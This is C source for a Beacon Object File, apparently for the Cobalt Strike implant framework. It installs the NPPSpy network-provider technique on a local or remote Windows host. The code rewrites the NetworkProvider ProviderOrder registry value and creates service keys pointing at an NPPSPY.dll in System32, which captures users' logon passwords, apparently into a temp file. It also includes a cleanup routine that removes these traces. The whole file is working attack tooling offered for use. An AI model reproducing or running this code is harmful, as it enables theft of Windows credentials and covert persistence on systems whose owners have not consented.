#include <windows.h>
#include "bofdefs.h"
#include "beacon.h"

void go(char* args, int length)
{
	//Declare beacon parser variables
	datap parser;
	BeaconDataParse(&parser, args, length);
	char* targetHost = "";
	char* dllPath[100] = { 0 };
	char* dllData;
	BOOL cleanup = 0;
	char* cleanupValue = "";

	targetHost = BeaconDataExtract(&parser, NULL);
	cleanup = BeaconDataInt(&parser);
	cleanupValue = BeaconDataExtract(&parser, NULL);

	/* debug only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] targetHost = %s", targetHost);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] cleanup = %d", cleanup);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] cleanupValue = %s", cleanupValue);//Debug Only
	*/

	//cleanup
	if (cleanup == 1)
	{
		HKEY hKey;

		if (MSVCRT$strcmp(targetHost, "local") == 0)
		{
			///////////////////////////////////////////////Local Cleanup///////////////////////////////////////////////
			LONG exist = KERNEL32$GetFileAttributesA("C:\\Windows\\System32\\NPPSPY.dll");
			if (exist == INVALID_FILE_ATTRIBUTES)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not find target file C:\\Windows\\System32\\NPPSPY.dll. Skipped!");

			}
			else
			{
				if (KERNEL32$DeleteFileA("C:\\Windows\\System32\\NPPSPY.dll"))
				{
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Removed C:\\Windows\\System32\\NPPSPY.dll successfully!");

				}
				else
				{
					BeaconPrintf(CALLBACK_ERROR, "Failed to delete C:\\Windows\\System32\\NPPSpy.dll, Error = %u\n", KERNEL32$GetLastError());


				}
			}
			exist = KERNEL32$GetFileAttributesA("C:\\Windows\\temp\\wct42KH.tmp");
			if (exist == INVALID_FILE_ATTRIBUTES)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not find target file C:\\Windows\\temp\\wct42KH.tmp. Skipped!");

			}
			else
			{
				if (KERNEL32$DeleteFileA("C:\\Windows\\temp\\wct42KH.tmp"))
				{
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Removed C:\\Windows\\temp\\wct42KH.tmp successfully!");

				}
				else
				{
					BeaconPrintf(CALLBACK_ERROR, "Failed to delete C:\\Windows\\temp\\wct42KH.tmp, Error = %u\n", KERNEL32$GetLastError());
				}
			}
			
			LONG result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order", 0, KEY_ALL_ACCESS, &hKey);

			if (result == ERROR_SUCCESS)
			{
				if (ADVAPI32$RegSetValueExA(hKey, "PROVIDERORDER", 0, REG_SZ, (LPBYTE)cleanupValue, MSVCRT$strlen(cleanupValue) + 1) == ERROR_SUCCESS) {
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Reset the value HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\ProviderOrder successfully!");
				}
				else
				{
					BeaconPrintf(CALLBACK_ERROR, "Failed to reset the value of PROVIDERORDER, Error = %u\n", KERNEL32$GetLastError());

				}
				ADVAPI32$RegCloseKey(hKey);
			}


			result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\ProviderOrder", 0, KEY_ALL_ACCESS, &hKey);
			if (result == ERROR_SUCCESS)
			{
				if (ADVAPI32$RegDeleteValueA(hKey, "NPPSpy") != ERROR_SUCCESS) {
					BeaconPrintf(CALLBACK_ERROR, "Failed to remove NetworkProvider\\ProviderOrder, Error = %u", KERNEL32$GetLastError());

				}
				else
				{
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Removed the value HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\ProviderOrder\\NPPSpy successfully!");
				}
				ADVAPI32$RegCloseKey(hKey);
			}
			else if (result == ERROR_FILE_NOT_FOUND)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not find target registry SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\ProviderOrder. Skipped!");

			}
			else
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to find/open key SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\ProviderOrder,  Error = %u", KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);

			}

			result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services", 0, KEY_ALL_ACCESS, &hKey);
			if (result == ERROR_SUCCESS)
			{
				if (ADVAPI32$RegDeleteTreeA(hKey, "NPPSpy") == ERROR_SUCCESS) {
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Removed the register key HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy successfully!");
				}
				else
				{
					if (KERNEL32$GetLastError() == 2)
					{
						BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not find the registry key for NPPSpy. Skipped!");
					}
					else {
						BeaconPrintf(CALLBACK_ERROR, "Failed to remove registry key for NPPSpy, Error = %u", KERNEL32$GetLastError());
					}
				}
				ADVAPI32$RegCloseKey(hKey);
			}
			else if (result == ERROR_FILE_NOT_FOUND)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not find target registry SYSTEM\\CurrentControlSet\\Services. Skipped!");
			}
			else
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to find/open key HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy, Error = %u", KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);
			}
			return;
		}
		else
		{
			///////////////////////////////////////////////Remote Cleanup///////////////////////////////////////////////
			char* deletePath[100] = { 0 };
			MSVCRT$strcat((char*)deletePath, "\\\\");
			MSVCRT$strcat((char*)deletePath, targetHost);
			MSVCRT$strcat((char*)deletePath, "\\C$\\Windows\\System32\\NPPSPY.dll");
			LONG exist = KERNEL32$GetFileAttributesA(deletePath);
			if (exist == INVALID_FILE_ATTRIBUTES)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not find target file C:\\Windows\\System32\\NPPSPY.dll on %s. Skipped!", targetHost);
			}
			else
			{
				if (KERNEL32$DeleteFileA(deletePath))
				{
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Removed C:\\Windows\\System32\\NPPSPY.dll on %s successfully!", targetHost);

				}
				else
				{
					BeaconPrintf(CALLBACK_ERROR, "Failed to delete C:\\Windows\\System32\\NPPSPY.dll on %s, Error = %u", deletePath, KERNEL32$GetLastError());
				}
			}


			char* deleteTXTPath[100] = { 0 };
			MSVCRT$strcat((char*)deleteTXTPath, "\\\\");
			MSVCRT$strcat((char*)deleteTXTPath, targetHost);
			MSVCRT$strcat((char*)deleteTXTPath, "\\C$\\Windows\\temp\\wct42KH.tmp");
			exist = KERNEL32$GetFileAttributesA(deleteTXTPath);
			if (exist == INVALID_FILE_ATTRIBUTES)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not find target file C:\\Windows\\temp\\wct42KH.tmp on %s. Skipped!", targetHost);
			}
			else
			{
				if (KERNEL32$DeleteFileA(deleteTXTPath))
				{
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Removed C:\\Windows\\temp\\wct42KH.tmp on %s successfully!", targetHost);
				}
				else
				{
					BeaconPrintf(CALLBACK_ERROR, "Failed to delete C:\\Windows\\temp\\wct42KH.tmp on %s, Error = %u", deletePath, KERNEL32$GetLastError());
				}
			}

			HKEY hRemoteReg;
			if (ADVAPI32$RegConnectRegistryA(targetHost, HKEY_LOCAL_MACHINE, &hRemoteReg) != ERROR_SUCCESS) {
				BeaconPrintf(CALLBACK_ERROR, "Could not connect remote reg key on %s, Error = %u", targetHost, KERNEL32$GetLastError());
				return;
			}
			LONG result = ADVAPI32$RegOpenKeyExA(hRemoteReg, "SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order", 0, KEY_ALL_ACCESS, &hKey);

			if (result == ERROR_SUCCESS)
			{
				if (ADVAPI32$RegSetValueExA(hKey, "PROVIDERORDER", 0, REG_SZ, (LPBYTE)cleanupValue, MSVCRT$strlen(cleanupValue) + 1) == ERROR_SUCCESS) {
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Reset the value HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\ProviderOrder successfully!");
				}
				else
				{
					BeaconPrintf(CALLBACK_ERROR, "Failed to reset the value of PROVIDERORDER, Error = %u", KERNEL32$GetLastError());
				}
				ADVAPI32$RegCloseKey(hKey);
			}
			else if (result == ERROR_FILE_NOT_FOUND)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not find target registry SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order. Skipped!");
			}
			else
			{
				BeaconPrintf(CALLBACK_ERROR, "Could not open key on %s, Error = %u\n", targetHost, KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);
			}

			result = ADVAPI32$RegOpenKeyExA(hRemoteReg, "SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\ProviderOrder", 0, KEY_ALL_ACCESS, &hKey);

			if (result == ERROR_SUCCESS)
			{
				if (ADVAPI32$RegDeleteValueA(hKey, "NPPSpy") == ERROR_SUCCESS) {
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Removed the value HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\ProviderOrder\\NPPSpy successfully!");
				}
				else
				{
					BeaconPrintf(CALLBACK_ERROR, "Failed to remove NetworkProvider\\ProviderOrder\\NPPSpy, Error = %u\n", KERNEL32$GetLastError());
				}
				ADVAPI32$RegCloseKey(hKey);

			}
			else if (result == ERROR_FILE_NOT_FOUND)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not find target registry SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\ProviderOrder. Skipped!");
			}
			else
			{
				ADVAPI32$RegCloseKey(hKey);
				BeaconPrintf(CALLBACK_ERROR, "Failed to find/open key SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\ProviderOrder\\, Skipped! Error = %u", KERNEL32$GetLastError());
			}

			result = ADVAPI32$RegOpenKeyExA(hRemoteReg, "SYSTEM\\CurrentControlSet\\Services", 0, KEY_ALL_ACCESS, &hKey);
			if (result == ERROR_SUCCESS)
			{
				if (ADVAPI32$RegDeleteTreeA(hKey, "NPPSpy") == ERROR_SUCCESS) {
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Removed the register key HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy successfully!");
				}
				else
				{
					if (KERNEL32$GetLastError() == 2)
					{
						BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not find the registry key for NPPSpy. Skipped!");
					}
					else {
						BeaconPrintf(CALLBACK_ERROR, "Failed to remove registry key for NPPSpy, Error = %u", KERNEL32$GetLastError());
					}
				}
				ADVAPI32$RegCloseKey(hKey);
			}
			else if (result == ERROR_FILE_NOT_FOUND)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not find target registry SYSTEM\\CurrentControlSet\\Services. Skipped!");
			}
			else
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to open key SYSTEM\\CurrentControlSet\\Services, Skipped! Error = %u", KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);
			}
			return;
		}
		return;
	}


	HKEY hKey;

	if (MSVCRT$strcmp(targetHost, "local") == 0)
	{
		///////////////////////////////////////////////Local Registry///////////////////////////////////////////////

		LONG result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order", 0, KEY_ALL_ACCESS, &hKey);
		char value[1024];
		if (result == ERROR_SUCCESS) {
			DWORD size = sizeof(value);;
			if (ADVAPI32$RegGetValueA(hKey, NULL, "PROVIDERORDER", RRF_RT_REG_SZ, NULL, value, &size) != ERROR_SUCCESS) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to get value of PROVIDERORDER, Error = %u", KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);
				return;
			}
			BeaconPrintf(CALLBACK_OUTPUT, "*********************************************************\n[!] CleanUp command: bof-NPPSPY local cleanup %s\n*********************************************************",		value);

			// Append ",NPPSpy" to the value of PROVIDERORDER
			MSVCRT$strcat(value, ",NPPSpy");

			if (ADVAPI32$RegSetValueExA(hKey, "PROVIDERORDER", 0, REG_SZ, (LPBYTE)value, MSVCRT$strlen(value) + 1) == ERROR_SUCCESS) {
				BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully set the value of HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\ProviderOrder");
				ADVAPI32$RegCloseKey(hKey);
			}
			else
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to set value of HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\ProviderOrder, Error = %u", KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);
				return;
			}
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "Could not open key HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order, Error = %u", KERNEL32$GetLastError());
			BeaconPrintf(CALLBACK_ERROR, "Please ensure you are in elevated context!");
			return;
		}
		// Create the registry keys for NPPSpy
		if (ADVAPI32$RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\NPPSpy", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to create registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy, Error = %u", KERNEL32$GetLastError());
			return;
		}

		if (ADVAPI32$RegCreateKeyExA(hKey, "NetworkProvider", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to create subkey HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider, Error = %u", KERNEL32$GetLastError());
			ADVAPI32$RegCloseKey(hKey);
			return;
		}

		// Set the Class, Name, and ProviderPath values for the NetworkProvider key
		if (ADVAPI32$RegSetValueExA(hKey, "Class", 0, REG_DWORD, (BYTE*)&(DWORD) { 2 }, sizeof(DWORD)) != ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to set value \"Class\", Error = % u", KERNEL32$GetLastError());
			ADVAPI32$RegCloseKey(hKey);
			return;
		}

		if (ADVAPI32$RegSetValueExA(hKey, "Name", 0, REG_SZ, (BYTE*)"NPPSpy", MSVCRT$strlen("NPPSpy") + 1) != ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to set value \"Name\", Error = % u", KERNEL32$GetLastError());
			ADVAPI32$RegCloseKey(hKey);
			return;
		}

		if (ADVAPI32$RegSetValueExA(hKey, "ProviderPath", 0, REG_EXPAND_SZ, (BYTE*)"%SystemRoot%\\System32\\NPPSPY.dll", MSVCRT$strlen("%SystemRoot%\\System32\\NPPSPY.dll") + 1) != ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to set value \"ProviderPath\", Error = %u", KERNEL32$GetLastError());
			ADVAPI32$RegCloseKey(hKey);
			return;
		}
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully created registry keys");
	}
	else
	{
		///////////////////////////////////////////////Remote Registry///////////////////////////////////////////////
		HKEY hRemoteReg;
		if (ADVAPI32$RegConnectRegistryA(targetHost, HKEY_LOCAL_MACHINE, &hRemoteReg) != ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "Could not connect remote reg key on %s, Error = %u", targetHost, KERNEL32$GetLastError());
			return;
		}
		LONG result = ADVAPI32$RegOpenKeyExA(hRemoteReg, "SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order", 0, KEY_ALL_ACCESS, &hKey);

		if (result == ERROR_SUCCESS)
		{
			char value[1024];
			DWORD size = sizeof(value);;
			if (ADVAPI32$RegGetValueA(hKey, NULL, "PROVIDERORDER", RRF_RT_REG_SZ, NULL, value, &size) != ERROR_SUCCESS) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to get value of HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\ProviderOrder, Error = %u", KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);
				return;
			}
			BeaconPrintf(CALLBACK_OUTPUT, "*********************************************************\n[!] CleanUp command: bof-NPPSPY %s cleanup %s\n*********************************************************", targetHost, value);
			// Append ",NPPSpy" to the value of PROVIDERORDER
			MSVCRT$strcat(value, ",NPPSpy");

			if (ADVAPI32$RegSetValueExA(hKey, "PROVIDERORDER", 0, REG_SZ, (LPBYTE)value, MSVCRT$strlen(value) + 1) == ERROR_SUCCESS) {
				BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully set the value of HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\ProviderOrder");
				ADVAPI32$RegCloseKey(hKey);
			}
			else
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to set value of HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\ProviderOrder, Error = %u", KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);
				return;
			}
			result = ADVAPI32$RegOpenKeyExA(hRemoteReg, "SYSTEM\\CurrentControlSet\\Services\\", 0, KEY_ALL_ACCESS, &hKey);
			// Create the registry keys for NPPSpy
			if (ADVAPI32$RegCreateKeyExA(hKey, "NPPSpy", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to create registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy, Error = %u", KERNEL32$GetLastError());
				return;
			}

			if (ADVAPI32$RegCreateKeyExA(hKey, "NetworkProvider", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to create subkey HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider, Error = %u", KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);
				return;
			}

			// Set the Class, Name, and ProviderPath values for the NetworkProvider key
			if (ADVAPI32$RegSetValueExA(hKey, "Class", 0, REG_DWORD, (BYTE*)&(DWORD) { 2 }, sizeof(DWORD)) != ERROR_SUCCESS) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to set value \"Class\", Error = %u", KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);
				return;
			}

			if (ADVAPI32$RegSetValueExA(hKey, "Name", 0, REG_SZ, (BYTE*)"NPPSpy", MSVCRT$strlen("NPPSpy") + 1) != ERROR_SUCCESS) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to set value \"Name\", Error = %u", KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);
				return;
			}

			if (ADVAPI32$RegSetValueExA(hKey, "ProviderPath", 0, REG_EXPAND_SZ, (BYTE*)"%SystemRoot%\\System32\\NPPSPY.dll", MSVCRT$strlen("%SystemRoot%\\System32\\NPPSPY.dll") + 1) != ERROR_SUCCESS) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to set value \"ProviderPath\", Error = %u", KERNEL32$GetLastError());
				ADVAPI32$RegCloseKey(hKey);
				return;
			}
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully created registry keys");
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "Could not open key HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order on %s, Error = %u", targetHost, KERNEL32$GetLastError());
			BeaconPrintf(CALLBACK_ERROR, "Please ensure you are in elevated context on %s!", targetHost);
			return;
		}

	}

}
